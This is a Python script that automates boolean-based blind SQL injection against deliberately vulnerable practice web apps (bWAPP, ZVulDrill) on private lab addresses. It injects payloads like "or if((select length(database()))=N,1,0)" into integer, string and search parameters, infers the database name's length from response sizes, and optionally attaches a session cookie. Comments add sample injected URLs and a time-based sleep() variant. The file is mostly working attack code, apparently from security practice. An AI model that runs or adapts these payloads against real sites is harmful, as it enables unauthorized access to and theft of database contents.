#-*-coding:utf-8-*-
import urllib
from urllib import request


# select * from movies where id=1 or if((select length(database()))=6,1,0); # =可以换成<>
# http://192.168.52.128/bWAPP/bWAPP/sqli_2.php?action=go&movie=100 or if((select length(database()))=5,1,0)
# http://192.168.52.128/test2/zvuldrill-master/search.php?search=1%' or if((select length(database()))=9,1,0)%23
#if(({sql}),sleep(2),0)

#def get_dblength(url='http://192.168.52.128/test2/zvuldrill-master/search.php?search=1',cookie=False,type='search'):

def get_dblength(url='http://172.30.61.112/zvuldrill-master/search.php?search=1',cookie=False,type='search'):

    if type == 'int':
        payload = '+or+if((select+length(database()))={database_length},1,0)'
    elif type == 'string':
        payload = '\'+or+if((select+length(database()))={database_length},1,0)%23'
    elif type == 'search':
        payload = '%\'+or+if((select+length(database()))={database_length},1,0)%23'

    response_length = 0

    for i in range(1, 35):

        full_payload = payload.format(database_length=str(i))

        url_response = urllib.request.Request(url + full_payload)

        if (cookie != False):
           url_response.add_header('Cookie', cookie)

        url_read = request.urlopen(url_response).read()

        if response_length > len(url_read):
            print("database length is %d" %(i-1))
            break

        response_length = len(url_read)

if __name__ == "__main__":
        url1='http://192.168.52.128/test2/zvuldrill-master/search.php?search=1'
        url2='http://192.168.52.128/bWAPP/bWAPP/sqli_2.php?action=go&movie=100'
        url3='http://172.30.61.112/ZVulDrill-master/search.php?search=1'

        get_dblength()

        #get_dblength(glovar.url4,cookie=glovar.cookie,type='int')